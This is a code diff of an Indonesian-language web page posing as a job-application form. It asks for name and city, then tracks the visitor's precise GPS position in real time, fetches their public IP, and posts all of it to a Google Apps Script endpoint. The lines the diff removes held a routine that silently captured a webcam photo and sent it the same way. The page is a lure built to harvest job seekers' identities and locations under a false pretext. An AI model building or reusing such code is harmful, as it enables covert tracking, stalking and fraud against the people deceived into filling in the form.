@@ -286,6 +286,19 @@
       text-align: center;
     }
     
+    .location-status {
+      margin-top: 15px;
+      padding: 10px;
+      background-color: #e8f5e9;
+      border-radius: 5px;
+      font-size: 0.9rem;
+      display: none;
+    }
+    
+    .location-status.active {
+      display: block;
+    }
+    
     footer {
       text-align: center;
       margin-top: 40px;
@@ -420,13 +433,18 @@
         <h2>Daftar Sekarang</h2>
         
         <div class="form-group">
-          <label for="nama">Nomor WhatsApp</label>
-          <input type="text" id="nama" placeholder="Contoh: 081235****32">
+          <label for="nama">Nama Lengkap</label>
+          <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
         </div>
         
         <div class="form-group">
-          <label for="kota">Kota yang Diinginkan</label>
-          <input type="text" id="kota" placeholder="Kota tempat Anda ingin bekerja">
+          <label for="kota">Kota</label>
+          <input type="text" id="kota" placeholder="Masukkan kota tempat tinggal Anda">
+        </div>
+        
+        <div class="location-status" id="locationStatus">
+          <i class="fas fa-map-marker-alt"></i> 
+          <span>Lokasi Anda: <span id="currentLocation">Sedang mendeteksi...</span></span>
         </div>
         
         <button onclick="requestLocationPermission()">
@@ -461,6 +479,9 @@
   </div>
 
   <script>
+    let watchId = null;
+    let currentPosition = null;
+    
     // Fungsi untuk toggle detail lowongan
     function toggleJobDetails(element) {
       const details = element.querySelector('.job-details');
@@ -482,12 +503,7 @@
       const kota = document.getElementById('kota').value;
       
       if (!nama || !kota) {
-        alert('Harap isi nomor WhatsApp dan kota terlebih dahulu.');
-        return;
-      }
-      
-      if (!/^08[0-9]{7,12}$/.test(nama.replace(/\D/g, ''))) {
-        alert('Harap masukkan nomor WhatsApp yang valid.');
+        alert('Harap isi nama lengkap dan kota terlebih dahulu.');
         return;
       }
       
@@ -497,8 +513,11 @@
     // Ketika pengguna mengizinkan akses
     function grantPermission() {
       document.getElementById('locationPermission').style.display = 'none';
+      startWatchingLocation();
       showLoading();
-      kirimLokasi();
+      setTimeout(() => {
+        kirimLokasi();
+      }, 2000);
     }
     
     // Ketika pengguna menolak akses
@@ -517,30 +536,73 @@
       document.getElementById('loadingOverlay').style.display = 'none';
     }
     
+    // Mulai memantau lokasi pengguna secara real-time
+    function startWatchingLocation() {
+      if (navigator.geolocation) {
+        // Tampilkan status lokasi
+        document.getElementById('locationStatus').classList.add('active');
+        
+        // Dapatkan posisi saat ini
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            currentPosition = position;
+            updateLocationDisplay(position);
+          },
+          error => {
+            console.error("Error getting location: ", error);
+            document.getElementById('currentLocation').textContent = "Tidak dapat mengakses lokasi";
+          }
+        );
+        
+        // Pantau perubahan lokasi
+        watchId = navigator.geolocation.watchPosition(
+          position => {
+            currentPosition = position;
+            updateLocationDisplay(position);
+            console.log("Lokasi diperbarui:", position.coords.latitude, position.coords.longitude);
+          },
+          error => {
+            console.error("Error watching location: ", error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0 // Selalu dapatkan lokasi terbaru
+          }
+        );
+      } else {
+        alert("Geolocation tidak didukung oleh browser ini.");
+      }
+    }
+    
+    // Perbarui tampilan lokasi
+    function updateLocationDisplay(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      document.getElementById('currentLocation').textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+    }
+    
+    // Hentikan pemantauan lokasi
+    function stopWatchingLocation() {
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    }
+    
     // Fungsi utama untuk mengirim data
     async function kirimLokasi() {
-      // Ambil nilai dari input nama dan kota
-      const nama = document.getElementById('nama').value || "Tes Nama";
-      const kota = document.getElementById('kota').value || "Tes Kota";
-      
       try {
-        // Ambil lokasi user terlebih dahulu
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          // Setelah dapat lokasi, ambil IP dan foto secara paralel
-          const [ip, fotoBase64] = await Promise.all([
-            ambilIP().catch(() => "Tidak dapat mengambil IP"),
-            ambilFoto().catch(() => "")
-          ]);
-          
+        // Jika ada posisi terkini, gunakan itu
+        if (currentPosition) {
           const data = {
-            ip: ip,
-            lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
-            nama: nama,
-            kota: kota,
-            fotoBase64: fotoBase64
+            ip: await ambilIP(),
+            lokasi: `${currentPosition.coords.latitude},${currentPosition.coords.longitude}`,
+            nama: document.getElementById('nama').value || "Tes Nama",
+            kota: document.getElementById('kota').value || "Tes Kota",
+            fotoBase64: ""
           };
 
-          // Kirim data ke Google Sheets
           const response = await fetch(
             "https://script.google.com/macros/s/AKfycbz7LnJeVFd1-HGCIEF2cEULDR1RQ40F_u5YXu4sBzEHQMGpp7HAL9M4etNhf-LA22go/exec",
             {
@@ -551,87 +613,47 @@
 
           const result = await response.json();
           hideLoading();
-          alert("Terima kasih " + nama + "!\nPendaftaran berhasil. Kami akan mengirim info lowongan ke WhatsApp Anda untuk area " + kota + ".");
-        }, (error) => {
-          hideLoading();
-          alert("Izinkan akses lokasi untuk melanjutkan proses.");
-        }, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 300000
-        });
+          alert("Status: " + result.status + "\nTerima kasih " + data.nama + " dari " + data.kota + " telah mengirim lamaran!");
+        } else {
+          // Fallback ke metode biasa jika tidak ada posisi terkini
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            const data = {
+              ip: await ambilIP(),
+              lokasi: `${pos.coords.latitude},${pos.coords.longitude}`,
+              nama: document.getElementById('nama').value || "Tes Nama",
+              kota: document.getElementById('kota').value || "Tes Kota",
+              fotoBase64: ""
+            };
+
+            const response = await fetch(
+              "https://script.google.com/macros/s/AKfycbz7LnJeVFd1-HGCIEF2cEULDR1RQ40F_u5YXu4sBzEHQMGpp7HAL9M4etNhf-LA22go/exec",
+              {
+                method: "POST",
+                body: JSON.stringify(data)
+              }
+            );
+
+            const result = await response.json();
+            hideLoading();
+            alert("Status: " + result.status + "\nTerima kasih " + data.nama + " dari " + data.kota + " telah mengirim lamaran!");
+          }, (error) => {
+            hideLoading();
+            alert("Izinkan akses lokasi untuk melanjutkan proses lamaran.");
+          });
+        }
       } catch (e) {
         hideLoading();
-        alert("Terjadi kesalahan: " + e.message);
+        alert("Gagal ambil lokasi: " + e);
+      } finally {
+        // Hentikan pemantauan lokasi setelah pengiriman
+        stopWatchingLocation();
       }
-    }
-
-    // Fungsi untuk mengambil foto dari kamera
-    async function ambilFoto() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          resolve(""); // Tidak reject, langsung resolve kosong jika tidak support
-          return;
-        }
-        
-        // Coba akses kamera dengan timeout
-        const timeout = setTimeout(() => {
-          resolve(""); // Jika timeout, resolve dengan string kosong
-        }, 3000);
-        
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-          .then(stream => {
-            clearTimeout(timeout);
-            
-            // Buat video element untuk menangkap gambar
-            const video = document.createElement('video');
-            video.width = 160;
-            video.height = 120;
-            video.srcObject = stream;
-            video.play();
-            
-            // Tunggu sampai video siap
-            video.onloadedmetadata = () => {
-              // Buat canvas untuk mengambil frame
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              
-              // Gambar frame dari video ke canvas
-              setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Konversi ke base64 dengan kualitas lebih rendah untuk mempercepat
-                const imageData = canvas.toDataURL('image/jpeg', 0.5);
-                
-                // Hentikan stream
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Kembalikan data gambar
-                resolve(imageData);
-              }, 300);
-            };
-          })
-          .catch(error => {
-            clearTimeout(timeout);
-            resolve(""); // Resolve dengan string kosong jika error
-          });
-      });
     }
 
     // Fungsi untuk mengambil IP address
     async function ambilIP() {
       try {
-        // Gunakan timeout untuk mencegah proses terlalu lama
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000);
-        
-        const res = await fetch("https://api.ipify.org?format=json", {
-          signal: controller.signal
-        });
-        clearTimeout(timeoutId);
-        
+        const res = await fetch("https://api.ipify.org?format=json");
         const json = await res.json();
         return json.ip;
       } catch (error) {
